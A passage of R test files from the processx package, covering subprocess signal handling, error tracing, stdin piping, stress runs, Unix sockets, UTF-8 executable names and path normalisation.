    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))

    list(alive = px$is_alive(), status = px$get_exit_status())
  })

  expect_false(res$result$alive)
  expect_true(res$result$status %in% c(0L, NA_integer_))
})

test_that("finalizer", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))
    tryCatch(
      {
        rm(px)
        gc()
        "OK"
      },
      error = function(x) x
    )
  })

  expect_identical(res$result, "OK")
})

test_that("get_exit_status", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))
    px$get_exit_status()
  })

  expect_true(res$result %in% c(0L, NA_integer_))
})

test_that("signal", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))

    signal <- px$signal(2) # SIGINT
    status <- px$get_exit_status()
    list(signal = signal, status = status)
  })

  # TRUE means that that signal was delivered, but it is different on
  # various Unix flavours. Some will deliver a SIGINT to a zombie, some
  # will not, so we don't test for this.
  expect_true(res$result$status %in% c(0L, NA_integer_))
})


test_that("kill", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))
    kill <- px$kill()
    status <- px$get_exit_status()
    list(kill = kill, status = status)
  })

  # FALSE means that that signal was not delivered
  expect_false(res$result$kill)
  expect_true(res$result$status %in% c(0L, NA_integer_))
})

test_that("SIGCHLD handler", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
    on.exit(try(px$kill(), silent = TRUE), add = TRUE)

    p <- mcparallel(Sys.sleep(1))
    q <- mcparallel(Sys.sleep(1))
    res <- mccollect(list(p, q))

    out <- tryCatch(
      {
        px2 <- process$new("true")
        px2$wait(1)
        "OK"
      },
      error = function(e) e
    )

    list(out = out, status = px$get_exit_status())
  })

  expect_identical(res$result$out, "OK")
  expect_true(res$result$status %in% c(0L, NA_integer_))
})

test_that("Notify old signal handler", {
  skip_on_cran()
  skip_other_platforms("unix")

  code <- substitute({
    # Create cluster, check that it works
    cl <- parallel::makeForkCluster(2)
    parallel::mclapply(1:2, function(x) x)

    # Run a parallel background job
    job <- parallel::mcparallel(Sys.sleep(.5))

    # Start processx process, it will overwrite the signal handler
    processx::run("true")

    # Wait for parallel job to finish
    parallel::mccollect(job)
  })

  script <- tempfile(pattern = "processx-test-", fileext = ".R")
  on.exit(unlink(script), add = TRUE)
  cat(deparse(code), sep = "\n", file = script)

  env <- c(callr::rcmd_safe_env(), PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  ret <- callr::rscript(
    script,
    env = env,
    fail_on_status = FALSE,
    show = FALSE,
    timeout = 5
  )

  # parallel sends a message to stderr, complaining about unable to
  # to terminate some child processes. That should not happen any more.
  expect_equal(ret$status, 0)
  expect_equal(ret$stderr, "")
})

test_that("it is ok if parallel has no active cluster", {
  skip_on_cran()
  skip_other_platforms("unix")

  code <- substitute({
    cl <- parallel::makeForkCluster(2)
    if (getRversion() < "3.5.0") {
      parallel::setDefaultCluster(cl)
    }
    parallel::mclapply(1:2, function(x) x)

    job <- parallel::mcparallel(Sys.sleep(.5))
    processx::run("true")
    parallel::mccollect(job)

    # stop cluster, verify that we don't have subprocesses
    parallel::stopCluster(cl)
    print(ps::ps_children(ps::ps_handle()))

    # try to run sg, this still calls the old sigchld handler
    for (i in 1:5) {
      processx::run("true")
    }
  })

  script <- tempfile(pattern = "processx-test-", fileext = ".R")
  on.exit(unlink(script), add = TRUE)
  cat(deparse(code), sep = "\n", file = script)

  env <- c(callr::rcmd_safe_env(), PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  ret <- callr::rscript(
    script,
    env = env,
    fail_on_status = FALSE,
    show = FALSE,
    timeout = 5
  )

  expect_equal(ret$status, 0)

  # R < 3.5.0 does not kill the subprocesses propery, it seems
  if (getRversion() >= "3.5.0") {
    expect_match(ret$stdout, "list()")
  } else {
    expect_true(TRUE)
  }
})
````

### `px390/processx/tests/testthat/test-standalone-errors.R`

````r
test_that("throw() is standalone", {
  stenv <- environment(throw)
  objs <- ls(stenv, all.names = TRUE)
  funs <- Filter(function(x) is.function(stenv[[x]]), objs)
  funobjs <- mget(funs, stenv)
  for (f in funobjs) {
    expect_identical(environmentName(topenv(f)), "base")
  }

  skip_if_not_installed("codetools")
  expect_message(
    withCallingHandlers(
      res <- mapply(
        codetools::checkUsage,
        funobjs,
        funs,
        MoreArgs = list(report = message)
      ),
      message = function(c) {
        if (grepl(".hide_from_trace", c$message)) {
          invokeRestart("muffleMessage")
        }
      }
    ),
    NA
  )
})

test_that("new_cond", {
  c <- new_cond("foo", "bar")
  expect_identical(class(c), "condition")
  expect_identical(c$message, "foobar")
})

test_that("new_error", {
  c <- new_error("foo", "bar")
  expect_identical(
    class(c),
    c("rlib_error_3_0", "rlib_error", "error", "condition")
  )
  expect_identical(c$message, "foobar")
})

test_that("throw() works with condition objects or strings", {
  expect_error(
    throw("foobar"),
    "foobar",
    class = "rlib_error"
  )
  expect_error(
    throw(new_error("foobar")),
    "foobar",
    class = "rlib_error"
  )
})

test_that("parent must be an error object", {
  expect_error(
    throw(new_error("foobar"), parent = "nope"),
    "Parent condition must be a condition object",
    class = "rlib_error"
  )
})

test_that("throw() adds the proper call, if requested", {
  f <- function() throw(new_error("ooops"))
  err <- tryCatch(f(), error = function(e) e)
  expect_s3_class(err, "rlib_error")
  expect_identical(deparse(err$call), "f()")

  g <- function() throw(new_error("ooops", call. = FALSE))
  err <- tryCatch(g(), error = function(e) e)
  expect_s3_class(err, "rlib_error")
  expect_null(err$call)
})

test_that("throw() only stops for errors", {
  f <- function() throw(new_cond("nothing important"))

  expect_error(f(), NA)
})

test_that("caught conditions have no trace", {
  f <- function() throw(new_error("nothing important"))

  cond <- tryCatch(f(), condition = function(e) e)
  expect_null(cond$trace)
})

test_that("un-caught condition has trace", {
  skip_on_cran()

  # We need to run this in a separate script, because
  # testthat catches all conditions. We also cannot run it in callr::r()
  # or similar, because those catch conditions as well.

  sf <- tempfile(fileext = ".R")
  op <- sub("\\.R$", ".rds", sf)
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(sf, op, so, se), recursive = TRUE), add = TRUE)

  expr <- substitute(
    {
      f <- function() g()
      g <- function() processx:::throw(processx:::new_error("oooops"))
      options(rlib_error_handler = function(c) {
        saveRDS(c, file = `__op__`)
      })
      f()
    },
    list("__op__" = op)
  )

  cat(deparse(expr), file = sf, sep = "\n")

  callr::rscript(sf, stdout = so, stderr = se)

  cond <- readRDS(op)
  expect_s3_class(cond, "rlib_error")
  expect_s3_class(cond$trace, "rlib_trace")
})

test_that("chain_call", {
  do <- function() {
    chain_call(c_processx_base64_encode, "foobar")
  }
  cond <- tryCatch(
    do(),
    error = function(e) e
  )

  expect_equal(deparse(cond$call), "do()")
  expect_s3_class(cond, "c_error")
  expect_s3_class(cond, "rlib_error")
})

test_that("errors from subprocess", {
  skip_if_not_installed("callr", minimum_version = "3.7.0.9000")
  err <- tryCatch(
    callr::r(function() 1 + "a"),
    error = function(e) e
  )
  expect_s3_class(err, "rlib_error")
  expect_s3_class(err$parent, "error")
  expect_false(is.null(err$parent_trace))
})

test_that("error trace from subprocess", {
  skip_on_cran()
  skip_if_not_installed("callr", minimum_version = "3.7.0.9000")

  sf <- tempfile(fileext = ".R")
  op <- sub("\\.R$", ".rds", sf)
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(sf, op, so, se), recursive = TRUE), add = TRUE)

  expr <- substitute(
    {
      h <- function() callr::r(function() 1 + "a")
      options(rlib_error_handler = function(c) {
        saveRDS(c, file = `__op__`)
        # quit after the first, because the other one is caught here as well
        q()
      })
      h()
    },
    list("__op__" = op)
  )

  cat(deparse(expr), file = sf, sep = "\n")

  callr::rscript(sf, stdout = so, stderr = se)

  cond <- readRDS(op)

  expect_s3_class(cond, "rlib_error")
  expect_s3_class(cond$parent, "error")
  expect_s3_class(cond$trace, "rlib_trace")
})

test_that("error trace from throw() in subprocess", {
  skip_on_cran()
  skip_if_not_installed("callr", minimum_version = "3.7.0.9000")

  sf <- tempfile(fileext = ".R")
  op <- sub("\\.R$", ".rds", sf)
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(sf, op, so, se), recursive = TRUE), add = TRUE)

  expr <- substitute(
    {
      h <- function() callr::r(function() processx::run("does-not-exist---"))
      options(rlib_error_handler = function(c) {
        saveRDS(c, file = `__op__`)
        # quit after the first, because the other one is caught here as well
        q()
      })
      h()
    },
    list("__op__" = op)
  )

  cat(deparse(expr), file = sf, sep = "\n")

  callr::rscript(sf, stdout = so, stderr = se)

  cond <- readRDS(op)

  expect_s3_class(cond, "rlib_error")
  expect_s3_class(cond$parent, "rlib_error")
  expect_s3_class(cond$trace, "rlib_trace")
})

test_that("trace is not overwritten", {
  skip_on_cran()
  withr::local_options(list(rlib_error_always_trace = TRUE))
  err <- new_error("foobar")
  err$trace <- "not really"

  err2 <- tryCatch(throw(err), error = function(e) e)
  expect_identical(err2$trace, "not really")
})

test_that("error is printed on error", {
  skip_on_cran()

  sf <- tempfile(fileext = ".R")
  op <- sub("\\.R$", ".rds", sf)
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(sf, op, so, se), recursive = TRUE), add = TRUE)

  expr <- substitute({
    options(rlib_interactive = TRUE)
    processx::run(basename(tempfile()))
  })

  cat(deparse(expr), file = sf, sep = "\n")

  callr::rscript(
    sf,
    stdout = so,
    stderr = se,
    fail_on_status = FALSE,
    show = FALSE
  )

  selines <- readLines(so)
  expect_true(
    any(grepl("No such file or directory", selines)) ||
      any(grepl("Command .* not found", selines))
  )
  expect_false(any(grepl("Stack trace", selines)))
})

test_that("trace is printed on error in non-interactive sessions", {
  sf <- tempfile(fileext = ".R")
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(sf, so, se), recursive = TRUE), add = TRUE)

  expr <- substitute({
    processx::run(basename(tempfile()))
  })

  cat(deparse(expr), file = sf, sep = "\n")

  callr::rscript(
    sf,
    stdout = so,
    stderr = se,
    fail_on_status = FALSE,
    show = FALSE
  )

  selines <- readLines(se)
  expect_true(
    any(grepl("No such file or directory", selines)) ||
      any(grepl("Command .* not found", selines))
  )
  expect_true(any(grepl("Backtrace", selines)))
})

test_that("can pass frame as error call in `new_error()`", {
  check_bar <- function(call = parent.frame()) {
    check_foo(call = call)
  }
  check_foo <- function(call = parent.frame()) {
    throw(new_error("my message", call. = call))
  }
  f <- function() check_bar()
  g <- function() check_foo()

  expect_snapshot(error = TRUE, {
    f()
    g()
  })
})

test_that("can pass frame as error call in `throw()`", {
  check_bar <- function(call = parent.frame()) {
    check_foo(call = call)
  }
  check_foo <- function(call = parent.frame()) {
    throw(new_error("my message"), call = call)
  }
  f <- function() check_bar()
  g <- function() check_foo()

  expect_snapshot(error = TRUE, {
    f()
    g()
  })
})
````

### `px390/processx/tests/testthat/test-stdin.R`

````r
test_that("stdin", {
  skip_on_cran()
  skip_if_no_tool("cat")

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  p <- process$new("cat", stdin = "|", stdout = tmp, stderr = "|")
  expect_true(p$is_alive())

  p$write_input("foo\n")
  p$write_input("bar\n")
  expect_true(p$is_alive())

  close(p$get_input_connection())
  p$wait(5000)
  expect_false(p$is_alive())
  p$kill()

  expect_equal(readLines(tmp), c("foo", "bar"))
})

test_that("stdin & stdout", {
  skip_on_cran()
  skip_if_no_tool("cat")

  p <- process$new("cat", stdin = "|", stdout = "|")
  expect_true(p$is_alive())

  p$write_input("foo\n")
  p$poll_io(1000)
  expect_equal(p$read_output_lines(), "foo")

  p$write_input("bar\n")
  p$poll_io(1000)
  expect_equal(p$read_output_lines(), "bar")

  close(p$get_input_connection())
  p$wait(10)
  expect_false(p$is_alive())
  p$kill()
})

test_that("stdin buffer full", {
  skip_on_cran()
  skip_other_platforms("unix")

  px <- get_tool("px")
  p <- process$new(px, c("sleep", 100), stdin = "|")
  on.exit(p$kill(), add = TRUE)
  for (i in 1:100000) {
    ret <- p$write_input("foobar")
    if (length(ret) > 0) break
  }

  expect_true(length(ret) > 0)
})

test_that("file as stdin", {
  skip_on_cran()
  skip_if_no_tool("cat")

  tmp <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp, tmp2), recursive = TRUE), add = TRUE)

  txt <- strrep(paste(sample(letters, 10), collapse = ""), 100)
  cat(txt, file = tmp)

  p <- process$new("cat", stdin = tmp, stdout = tmp2)
  on.exit(p$kill(), add = TRUE)
  p$wait()
  expect_true(file.exists(tmp2))
  expect_equal(readChar(tmp2, nchar(txt)), txt)
})

test_that("large file as stdin", {
  skip_on_cran()
  skip_if_no_tool("cat")

  tmp <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp, tmp2), recursive = TRUE), add = TRUE)

  txt <- strrep(paste(sample(letters, 10), collapse = ""), 10000)
  cat(txt, file = tmp)

  p <- process$new("cat", stdin = tmp, stdout = tmp2)
  on.exit(p$kill(), add = TRUE)
  p$wait()
  expect_true(file.exists(tmp2))
  expect_equal(file.info(tmp2)$size, nchar(txt))
})

test_that("writing raw", {
  skip_on_cran()
  skip_if_no_tool("cat")

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  p <- process$new("cat", stdin = "|", stdout = tmp, stderr = "|")
  expect_true(p$is_alive())

  foo <- charToRaw("foo\n")
  bar <- charToRaw("bar\n")
  p$write_input(foo)
  p$write_input(bar)
  expect_true(p$is_alive())

  close(p$get_input_connection())
  p$wait(5000)
  expect_false(p$is_alive())
  p$kill()

  expect_equal(readLines(tmp), c("foo", "bar"))
})
````

### `px390/processx/tests/testthat/test-stress.R`

````r
test_that("can start 100 processes quickly", {
  skip_on_cran()
  px <- get_tool("px")
  expect_error(
    for (i in 1:100) {
      run(px)
    },
    NA
  )
  gc()
})

test_that("run() a lot of times, with small timeouts", {
  skip_on_cran()
  px <- get_tool("px")
  for (i in 1:100) {
    tic <- Sys.time()
    err <- tryCatch(
      run(px, c("sleep", "5"), timeout = 1 / 1000),
      error = identity
    )
    expect_s3_class(err, "system_command_timeout_error")
    expect_true(Sys.time() - tic < as.difftime(3, units = "secs"))
  }
  gc()
})

test_that("run() and kill while polling", {
  skip_on_cran()
  px <- get_tool("px")
  for (i in 1:10) {
    tic <- Sys.time()
    err <- tryCatch(
      run(px, c("sleep", "5"), timeout = 1 / 2),
      error = identity
    )
    expect_s3_class(err, "system_command_timeout_error")
    expect_true(Sys.time() - tic < as.difftime(3, units = "secs"))
  }
  gc()
})
````

### `px390/processx/tests/testthat/test-unix-sockets.R`

````r
test_that("CRUD", {
  skip_on_cran()
  skip_if_no_srcrefs()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  expect_equal(
    poll(list(sock1), 10),
    list("timeout")
  )
  expect_equal(conn_unix_socket_state(sock1), "listening")

  if (is_windows()) {
    expect_equal(conn_file_name(sock1), make_pipe_file_name(sock))
  } else {
    expect_equal(conn_file_name(sock1), sock)
  }

  pr <- poll(list(sock1), 1)
  expect_equal(pr, list("timeout"))

  sock2 <- conn_connect_unix_socket(sock)
  expect_equal(conn_unix_socket_state(sock2), "connected_client")

  pr <- poll(list(sock1), 0)
  expect_equal(pr, list("connect"))
  expect_equal(conn_unix_socket_state(sock1), "listening")

  conn_accept_unix_socket(sock1)
  expect_equal(conn_unix_socket_state(sock1), "connected_server")

  skip_if_no_srcrefs()
  expect_snapshot(
    error = TRUE,
    conn_accept_unix_socket(sock1),
    transform = transform_column_number
  )

  pr <- poll(list(sock1, sock2), 1)
  expect_equal(pr, list("timeout", "timeout"))

  conn_write(sock1, "hello\n")
  pr <- poll(list(sock1, sock2), 1)
  expect_equal(pr, list("silent", "ready"))

  conn_write(sock2, "hello there\n")
  pr <- poll(list(sock1, sock2), 1)
  expect_equal(pr, list("ready", "ready"))

  msg1 <- conn_read_lines(sock1)
  msg2 <- conn_read_lines(sock2)
  expect_equal(msg1, "hello there")
  expect_equal(msg2, "hello")

  pr <- poll(list(sock1, sock2), 1)
  expect_equal(pr, list("timeout", "timeout"))

  close(sock2)
  expect_equal(conn_read_chars(sock1), "")
  expect_false(conn_is_incomplete(sock1))
  close(sock1)
})

test_that("client can read / write before accept", {
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)

  expect_equal(conn_read_chars(sock2), "")
  expect_equal(conn_read_lines(sock2), character())
  expect_equal(conn_write(sock2, "hello\n"), raw(0))

  conn_accept_unix_socket(sock1)
  expect_equal(poll(list(sock1), 0), list("ready"))
  expect_equal(conn_read_lines(sock1), "hello")
  close(sock1)
  close(sock2)
})

test_that("poll returns connect", {
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)

  pr <- poll(list(sock1), 0)
  expect_equal(pr, list("connect"))
  close(sock1)
  close(sock2)
})

test_that("poll returns connect even if pipes are connected", {
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)
  pr <- poll(list(sock1), 0)
  expect_equal(pr, list("connect"))
  close(sock1)
  close(sock2)
})

test_that("reading unaccepted server socket is error", {
  # but maybe not on Windows: TODO
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)
  expect_equal(
    poll(list(sock1), 3000),
    list("connect")
  )

  skip_if_no_srcrefs()
  expect_snapshot(
    error = TRUE,
    conn_read_chars(sock1),
    transform = transform_column_number,
    variant = sysname()
  )

  close(sock1)
  close(sock2)
})

test_that("writing unaccepted server socket is error", {
  # but maybe not on Windows: TODO
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)
  expect_equal(
    poll(list(sock1), 3000),
    list("connect")
  )
  skip_if_no_srcrefs()
  expect_snapshot(
    error = TRUE,
    conn_write(sock1, "Hello\n"),
    transform = transform_column_number
  )

  close(sock1)
  close(sock2)
})

test_that("here is no extra ready for poll(), without data", {
  # on Widows
  skip_on_cran()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)
  sock2 <- conn_connect_unix_socket(sock)
  conn_write(sock2, "hello boss\n")

  pr <- poll(list(sock1), 0)
  expect_equal(pr, list("connect"))

  conn_accept_unix_socket(sock1)
  expect_equal(
    conn_read_lines(sock1),
    "hello boss"
  )

  close(sock1)
  close(sock2)
})

test_that("closing the other end finishes `poll()`, on macOS", {
  skip_on_cran()
  # seems fragile in covr
  skip_on_covr()

  sock <- tempfile()
  on.exit(unlink(sock), add = TRUE)
  if (is_windows()) {
    sock <- basename(sock)
  }

  sock1 <- conn_create_unix_socket(sock)

  connect <- function(sock) {
    sock2 <- processx::conn_connect_unix_socket(sock)
    processx::conn_write(sock2, "hello boss\n")
    processx::poll(list(sock2), 3000)
    ret <- processx::conn_read_lines(sock2)
    close(sock2)
    ret
  }

  client <- callr::r_bg(connect, args = list(sock = sock))
  on.exit(client$kill(), add = TRUE)

  pr <- poll(list(sock1), 2000)
  expect_equal(pr, list("connect"))
  conn_accept_unix_socket(sock1)

  pr <- poll(list(sock1), 2000)
  expect_equal(pr, list("ready"))
  lines <- conn_read_lines(sock1)
  expect_equal(lines, "hello boss")
  conn_write(sock1, "hello you\n")

  pr <- poll(list(sock1), 2000)
  expect_equal(pr, list("ready"))
  expect_equal(conn_read_chars(sock1), "")
  expect_false(conn_is_incomplete(sock1))
  close(sock1)

  client$wait(2000)
  expect_false(client$is_alive())
  expect_equal(client$get_result(), "hello you")
})

test_that("errors", {
  skip_on_cran()
  skip_if_no_srcrefs()

  if (!is_windows()) {
    sock <- file.path(tempdir(), strrep(basename(tempfile()), 1000))
    expect_snapshot(
      error = TRUE,
      {
        conn_create_unix_socket(sock)
        conn_create_unix_socket("/dev/null")
        conn_connect_unix_socket("/dev/null")
      },
      transform = function(x) transform_column_number(transform_tempdir(x)),
      variant = sysname()
    )
  }

  ff <- conn_create_fifo()
  expect_snapshot(
    error = TRUE,
    conn_accept_unix_socket(ff),
    transform = transform_column_number
  )
  expect_snapshot(
    error = TRUE,
    conn_unix_socket_state(ff),
    transform = transform_column_number
  )
})

test_that("unix-sockets.h", {
  skip_on_cran()

  sock <- get_tool("sock")
  server <- conn_create_unix_socket()
  on.exit(close(server), add = TRUE)
  on.exit(unlink(conn_file_name(server)), add = TRUE)

  args <- conn_file_name(server)
  if (is_windows()) {
    args <- basename(args)
  }
  client <- process$new(sock, args, stdout = "|", stderr = "|")
  pr <- poll(list(server), 3000)
  expect_true(client$is_alive())
  expect_equal(pr, list("connect"))

  conn_accept_unix_socket(server)
  expect_equal(
    conn_write(server, "hello brother"),
    raw(0)
  )

  pr <- poll(list(server), 3000)
  expect_equal(pr, list("ready"))
  expect_equal(
    conn_read_chars(server),
    "hello there!"
  )

  poll(list(server), 3000)
  expect_equal(pr, list("ready"))

  expect_equal(
    conn_read_chars(server),
    ""
  )
  expect_false(
    conn_is_incomplete(server)
  )

  expect_false(client$is_alive())
})
````

### `px390/processx/tests/testthat/test-utf8.R`

````r
test_that("UTF-8 executable name", {
  skip_on_cran()
  local_temp_dir()
  name <- "./\u00fa\u00e1\u00f6\u0151\u00e9.exe"
  px <- get_tool("px")
  file.copy(px, name)
  out <- run(
    name,
    c("out", "hello", "return", 10),
    error_on_status = FALSE
  )
  expect_equal(out$stdout, "hello")
  expect_equal(out$status, 10)
})

test_that("UTF-8 directory name", {
  skip_on_cran()
  local_temp_dir()
  name <- "./\u00fa\u00e1\u00f6\u0151\u00e9.exe"
  # Older dir.create does not handle UTF-8 correctly
  if (getRversion() < "4.0.0") {
    dir.create(enc2native(name))
  } else {
    dir.create(name)
  }
  px <- get_tool("px")
  exe <- file.path(name, "px.exe")
  if (getRversion() < "4.0.0") {
    file.copy(px, enc2native(exe))
  } else {
    file.copy(px, exe)
  }
  out <- run(
    exe,
    c("out", "hello", "return", 10),
    error_on_status = FALSE
  )
  expect_equal(out$stdout, "hello")
  expect_equal(out$status, 10)
})

test_that("native program name is converted to UTF-8", {
  skip_other_platforms("windows")
  if (!l10n_info()$`Latin-1`) {
    skip("Needs latin1 locale")
  }
  local_temp_dir()
  exe <- enc2native("./\u00fa\u00e1\u00f6.exe")
  file.copy(get_tool("px"), exe)
  out <- run(exe, c("return", 10), error_on_status = FALSE)
  expect_equal(out$status, 10)
})

# TODO: more UTF-8 output

test_that("UTF-8 in stdout", {
  skip_on_cran()
  # "px" is not unicode on Windows, so we need to specify encoding = "latin1"
  enc <- if (is_windows()) "latin1" else ""
  out <- run(get_tool("px"), c("out", "\u00fa\u00e1\u00f6"), encoding = enc)
  expect_equal(out$stdout, "\u00fa\u00e1\u00f6")
})

test_that("UTF-8 in stderr", {
  skip_on_cran()
  # "px" is not unicode on Windows, so we need to specify encoding = "latin1"
  enc <- if (is_windows()) "latin1" else ""
  out <- run(get_tool("px"), c("err", "\u00fa\u00e1\u00f6"), encoding = enc)
  expect_equal(out$stderr, "\u00fa\u00e1\u00f6")
})
````

### `px390/processx/tests/testthat/test-utils.R`

````r
test_that("full_path gives correct values", {
  skip_on_cran()

  if (is_windows()) {
    # Will be something like "C:"
    drive <- substring(getwd(), 1, 2)
  } else {
    # Use "" so that file.path("", "a") will return "/a"
    drive <- ""
  }

  expect_identical(full_path("/a/b"), file.path(drive, "a/b"))
  expect_identical(full_path("/a/b/"), file.path(drive, "a/b"))
  expect_identical(full_path("/"), file.path(drive, ""))
  expect_identical(full_path("a"), file.path(getwd(), "a"))
  expect_identical(full_path("a/b"), file.path(getwd(), "a/b"))

  expect_identical(full_path("a/../b/c"), file.path(getwd(), "b/c"))
  expect_identical(
    full_path(
      "../../../../../../../../../../../../../../../../../../../../../../../a"
    ),
    file.path(drive, "a")
  )
  expect_identical(full_path("/../.././a"), file.path(drive, "a"))
  expect_identical(full_path("/a/./b/../c"), file.path(drive, "a/c"))

  expect_identical(
    full_path("~nonexistent_user"),
    file.path(getwd(), "~nonexistent_user")
  )
  expect_identical(
    full_path("~/a/../b"),
    # On Windows, path.expand() can return a path with backslashes
    gsub("\\", "/", path.expand("~/b"), fixed = TRUE)
  )

  expect_identical(full_path("a//b"), file.path(getwd(), "a/b"))
  expect_identical(full_path("/a//b"), file.path(drive, "a/b"))
})

test_that("full_path gives correct values, windows", {
  skip_other_platforms("windows")

  # Backslash separators
  expect_identical(full_path("f:\\a/b"), "f:/a/b")
  expect_identical(full_path("a\\b"), file.path(getwd(), "a/b"))
  expect_identical(full_path("a\\\\b"), file.path(getwd(), "a/b"))
  expect_identical(full_path("\\\\a\\b"), "//a/b")
  expect_identical(full_path("\\\\a/b/..\\c"), "//a/c")

  # Drives
  expect_identical(full_path("f:/a/b"), "f:/a/b")
  expect_identical(full_path("f:/a/b/../../.."), "f:/")
  expect_identical(full_path("f:/../a"), "f:/a")
  expect_identical(full_path("f:/"), "f:/")
  expect_identical(full_path("f:"), "f:/")

  # Leading double slashes. Server name always has trailing slash ("//server/"),
  # like drives do ("f:/"). But dirs on the server don't have a trailing slash.
  expect_identical(full_path("//a"), "//a/")
  expect_identical(full_path("//a/"), "//a/")
  expect_identical(full_path("//a/b"), "//a/b")
  expect_identical(full_path("//a/b/.."), "//a/")
  # Can't go .. to remove the server name
  expect_identical(full_path("//a/b/../.."), "//a/")
  expect_identical(full_path("//a/../b"), "//a/b")
  expect_snapshot(error = TRUE, {
    full_path("//")
    full_path("///")
    full_path("///a")
  })
})

test_that("full_path gives correct values, unix", {
  skip_other_platforms("unix")

  # Leading double slashes should collapse
  expect_identical(full_path("//"), "/")
  expect_identical(full_path("///a/"), "/a")
})

test_that("do_echo_cmd", {
  skip_other_platforms("unix")

  expect_output(
    withr::with_options(
      list(width = 20),
      do_echo_cmd("command", rep("a r g x", 3))
    ),
    "Running command \\\n  'a r g x' \\\n  'a r g x' \\\n  'a r g x'",
    fixed = TRUE
  )
})

test_that("sh_quote_smart", {
  cases <- list(
    list(c("foo", "bar")),
    list(character()),
    list("foo"),
    list(""),
    list("foo/bar123_-"),

    list("foo bar", shQuote("foo bar")),
    list(c("foo", "1 2"), c("foo", shQuote("1 2")))
  )

  for (c in cases) {
    expect_equal(sh_quote_smart(c[[1]]), c[[length(c)]])
  }
})

test_that("write_raw_stdout writes bytes without text translation", {
  skip_on_cran()

  # Include bytes that text mode would mangle: \n (0x0a), \r (0x0d),
  # \r\n pairs, NUL (0x00), and high bytes (0x80, 0xff).
  bytes <- as.raw(c(0x00, 0x01, 0x0a, 0x0d, 0x0d, 0x0a, 0x80, 0xff))

  px <- get_tool("px")
  tf <- tempfile()
  on.exit(unlink(tf), add = TRUE)

  p <- process$new(px, c("rawout", "00010a0d0d0a80ff"), stdout = tf)
  p$wait()

  result <- readBin(tf, "raw", n = file.size(tf))
  expect_identical(result, bytes)
})

test_that("base64", {
